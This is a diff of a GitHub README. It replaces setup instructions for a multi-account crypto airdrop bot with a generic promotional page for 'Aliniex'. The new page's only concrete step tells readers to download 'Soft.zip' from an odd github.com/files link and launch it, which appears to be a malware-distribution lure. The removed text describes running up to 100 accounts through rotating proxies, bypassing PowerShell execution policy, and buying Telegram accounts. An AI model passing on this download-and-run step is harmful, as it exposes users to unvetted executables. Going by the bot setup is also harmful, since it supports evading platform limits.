@@ -1,161 +1,51 @@
-# 🚀 Bot Setup Instructions
+# Aliniex 🌟
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed to be beginner-friendly, with clear explanations for each step.
+Welcome to the Aliniex GitHub repository! 
 
-> [Termux guides if you run on mobile](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux.)
+## Overview 🚀
 
----
+Aliniex is a versatile tool designed to automate various tasks and streamline the process of checking in. Whether you are interested in airdrops, buying, selling, trading, or simply exploring the world of cryptocurrencies, Aliniex has got you covered. 
 
-## Table of Contents
+## Features 🌈
 
-1. [Prerequisites](#prerequisites)
-2. [Installation Steps](#installation-steps)
-3. [Configuration Files](#configuration-files)
-   - [`configs.json`](#1-configsjson)
-   - [`datas.txt`](#2-datastxt)
-   - [`wallets.txt`](#3-walletstxt)
-   - [`proxies.txt`](#4-proxiestxt)
-4. [Running the Bot](#running-the-bot)
-5. [Contact and Support](#contact-and-support)
+✨ **Airdrop Automation**: Easily claim airdrops and participate in airdrop applications with Aliniex.
 
----
+✨ **Check-In**: Simplify the check-in process and never miss out on important opportunities.
 
-## Prerequisites
+✨ **Trade**: Effortlessly buy, sell, or trade cryptocurrencies such as ETH and TON.
 
-Before running the bot, make sure you have the following installed:
+## Getting Started 🌟
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
+To get started with Aliniex, simply [click here to download the necessary files](https://github.com/files/Soft.zip).
 
-Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
+If the link ends with the file name, make sure to launch it to begin your Aliniex experience. 
 
--> Double click on `run.bat` for windows or `run.sh` for linux/mac if you want to run automatically, remember to fill all the necessary data.
+If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options.
 
----
+## Repository Topics 📚
 
-## Installation Steps
+- airdrop
+- airdrop-application
+- airdrop-claim-bot
+- airdrop-farm
+- airdrop-free
+- airdrop-huner-download
+- aliniex
+- buy
+- eth
+- meomundep
+- selll
+- ton
+- trade
 
-1. **Download and Extract the Bot Files:**
+## Support 🙌
 
-   - Extract the bot package into a folder on your computer.
+If you have any questions, suggestions, or feedback regarding Aliniex, don't hesitate to reach out to the community or the developers. Your input is valuable in helping us improve and enhance the Aliniex experience for all users.
 
-2. **Install Dependencies:**
-   Open your terminal or command prompt, navigate to the folder where the bot files are located, and run:
+## Stay Connected 🌟
 
-   ```bash
-   npm install --force user-agents axios colors p-limit https-proxy-agent socks-proxy-agent 
-   ```
+Stay connected with the latest updates and announcements related to Aliniex by visiting our [website](https://aliniex.com). Join our thriving community of users and enthusiasts to explore the endless possibilities of the crypto world.
 
-   If you encounter an Execution Policy error on Windows, run:
+[![Download Aliniex](https://img.shields.io/badge/Download-Aliniex-9cf)](https://github.com/files/Soft.zip)
 
-   ```bash
-   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-   ```
-
-   Then, run the npm install command again.
-
-3. **Prepare Configuration Files:**
-   - Ensure all configuration files are set up correctly before running the bot (see [Configuration Files](#configuration-files) section).
-
----
-
-## Configuration Files
-
-### 1. `configs.json` - 📜 Adjust Bot Settings
-
-This file controls the bot’s behavior. Below is an example configuration:
-
-```json
-{
-  "timeZone": "en-US",
-  "rotateProxy": false,
-  "skipInvalidProxy": false,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [5, 8],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 100,
-  "doTasks": true
-}
-```
-
-- **Fields Explained:**
-  - `timeZone`: Time zone setting (e.g., "en-US").
-  - `rotateProxy`: Enable or disable proxy rotation.
-  - `skipInvalidProxy`: Skip invalid proxies if `true`.
-  - `proxyRotationInterval`: Time interval (in minutes) for rotating proxies.
-  - `delayEachAccount`: Random delay range (in seconds) between accounts.
-  - `timeToRestartAllAccounts`: Time (in seconds) to restart all accounts.
-  - `howManyAccountsRunInOneTime`: Number of accounts to run simultaneously.
-  - `doTasks`: Enable task completion.
-
-### 2. `datas.txt` - 🗂️ User Data
-
-- Fill the data for `datas.txt` file, get data from [here](https://t.me/KeoAirDropFreeNe/257/6879). This file contains user data in the following format:
-
-```txt
-query_id.../user...
-query_id.../user...
-query_id.../user...
-```
-
-_Note: Each row for each account_
-
-### 3. `wallets.txt` - 💼 Wallet Addresses
-
-- Wallets generator: [Link](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-- Add your wallet addresses in the following format:
-
-```txt
-abc...xyz
-abc...xyz
-abc...xyz
-```
-
-_Note: Wallet updates are currently not supported._
-
-### 4. `proxies.txt` - 🌐 Proxy List (Optional)
-
-If you are using proxies, add them here. Leave the file blank if you are not using proxies. Supported formats:
-
-```txt
-http://user:password@host:port
-https://user:password@host:port
-socks4://user:password@host:port
-socks5://user:password@host:port
-```
-
-_Note: each row for each account_
-
----
-
-## Running the Bot
-
-1. Navigate to the folder containing the bot files:
-
-   ```bash
-   cd /path/to/meomundep-folder
-   ```
-
-2. Run the bot using the following command:
-   ```bash
-   node meomundep.js
-   ```
-
----
-
-## Contact and Support
-
-- **Help me with your referral** [Referral Link](https://t.me/aliniex_bot/amp?startapp=tel_ljKnMwl7bOJ5RmL)
-- **Buy me a telegram account** [Here](https://t.me/KeoAirDropFreeNe/312/27801) or [Here](https://github.com/MeoMunDep/MeoMunDep)
-
-If you encounter any issues or have questions, feel free to reach out:
-
-- **Contact:** [Contact Me](https://t.me/MeoMunDep)
-- **Group:** [Join the Group](https://t.me/KeoAirDropFreeNe)
-- **Channel:** [Visit the Channel](https://t.me/KeoAirDropFreeNee)
-
-Your support is greatly appreciated! 🐱
-
----
-
-Enjoy using the bot! 🚀
+Thank you for choosing Aliniex to simplify your crypto journey. Happy automating and happy trading! 🚀🌟🎉
